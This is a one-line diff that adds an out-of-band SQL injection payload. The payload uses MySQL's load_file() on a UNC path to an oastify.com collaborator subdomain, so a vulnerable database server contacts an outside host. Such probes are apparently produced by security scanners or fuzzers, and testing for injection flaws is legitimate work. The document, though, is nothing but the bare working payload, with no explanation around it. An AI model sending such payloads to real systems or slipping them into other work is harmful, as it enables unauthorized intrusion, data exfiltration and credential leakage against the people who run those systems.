@@ -1,0 +1,1 @@
+(select load_file('\\\\525v9ehr33lwo134s5bwwmadx43xrrwfnhb9y2mr.oastify.com\\yni'))
